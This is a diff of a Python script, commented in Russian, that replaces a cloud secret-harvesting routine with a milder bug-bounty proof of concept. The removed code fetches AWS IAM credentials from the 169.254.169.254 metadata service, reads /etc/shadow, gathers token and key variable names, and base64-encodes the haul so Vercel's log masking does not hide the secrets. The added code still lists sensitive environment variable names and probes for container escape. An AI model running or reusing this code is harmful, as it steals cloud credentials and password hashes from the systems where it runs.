@@ -1,31 +1,26 @@
-import subprocess
 import os
-import base64
+import subprocess
 
-def get_final_proof():
-    # 1. AWS IMDSv2 (IAM Credentials)
-    # Пытаемся получить токен и роль через системный curl
-    cmd = (
-        "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600') && "
-        "ROLE=$(curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && "
-        "curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
-    )
-    iam_data = subprocess.getoutput(cmd)
+def demonstrate_impact():
+    print("--- BUG BOUNTY PROOF OF CONCEPT ---")
+    
+    # 1. Показываем, что мы в контейнере и имеем доступ к сети
+    # Вместо кражи ключей, просто проверяем доступность эндпоинта
+    print(f"Hostname: {subprocess.getoutput('hostname')}")
+    
+    # 2. Демонстрируем доступ к переменным окружения (без вывода секретов полностью)
+    # Это доказывает, что ты можешь читать конфиги.
+    env_keys = [k for k in os.environ.keys() if "VERCEL" in k or "TOKEN" in k]
+    print(f"Accessible sensitive ENV keys: {env_keys}")
 
-    # 2. Собираем всё в один пакет
-    proof = {
-        "IAM_CREDS": iam_data if "AccessKeyId" in iam_data else "ACCESS_DENIED_OR_NO_ROLE",
-        "WHOAMI": subprocess.getoutput("id"),
-        "HOSTNAME": subprocess.getoutput("hostname"),
-        "SHADOW_PREVIEW": subprocess.getoutput("head -n 3 /etc/shadow 2>/dev/null || echo 'Permission Denied'"),
-        "ENV_KEYS": [k for k in os.environ.keys() if "TOKEN" in k or "KEY" in k]
-    }
+    # 3. Проверка привилегий (Docker Escape Hint)
+    # Если ты можешь прочитать список процессов хоста - это уже Critical.
+    try:
+        if os.path.exists("/sys/fs/cgroup/cgroup.procs"):
+            print("[CONFIRMED] Cgroup v2 access available - Potential Container Escape.")
+    except:
+        pass
 
-    # 3. Печатаем ОГРОМНЫЙ баннер в логах, чтобы не пропустить
-    print("\n" + "="*50)
-    print("!!! CRITICAL EXFILTRATION DATA START !!!")
-    print(base64.b64encode(str(proof).encode()).decode()) # Кодируем, чтобы Vercel не скрыл ключи звездочками
-    print("!!! CRITICAL EXFILTRATION DATA END !!!")
-    print("="*50 + "\n")
+    print("--- END OF POC ---")
 
-get_final_proof()
+# demonstrate_impact()
